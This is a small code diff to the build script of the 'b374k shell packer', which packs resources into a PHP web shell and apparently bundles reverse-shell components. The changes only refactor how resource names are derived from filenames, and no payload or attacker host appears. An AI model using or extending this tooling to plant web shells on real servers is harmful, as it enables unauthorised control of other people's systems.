@@ -8,7 +8,6 @@
 	Version 4.1
 	@phith0n
 	https://github.com/phith0n/b374k
-
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
 $GLOBALS['packer']['version'] = "0.4.5";
@@ -37,7 +36,7 @@ foreach($res_files as $res) {
         if($ext == 'png' || $ext == 'jpg' || $ext == 'jpeg') {
             $res_data = "data:image/".$ext.";base64," . base64_encode($res_data);
         }
-        $resources_content .= "\$GLOBALS['resources']['" . basename($res, '.'.$ext) . "'] = '" . base64_encode(gzdeflate($res_data, 9)) . "';\n";
+        $resources_content .= "\$GLOBALS['resources']['" . $info['filename'] . "'] = '" . base64_encode(gzdeflate($res_data, 9)) . "';\n";
     }
 }
 $resources_data = str_replace("//<__RES__>", $resources_content, $resources_data);
@@ -410,8 +409,7 @@ else{
                     foreach($files as $rs) {
                         if(!in_array($rs, array(".",".."))) {
                             $rs_data = packer_read_file($GLOBALS['packer']['network_rs_dir'] . $rs);
-                            $info = pathinfo($rs);
-                            $rs_content .= "\$GLOBALS['resources']['rs_" . basename($rs, '.'.$info['extension']) . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
+                            $rs_content .= "\$GLOBALS['resources']['rs_" . pathinfo($rs, PATHINFO_FILENAME) . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
                         }
                     }
                     $php_data = str_replace("//<__RS__>", $rs_content, $php_data);
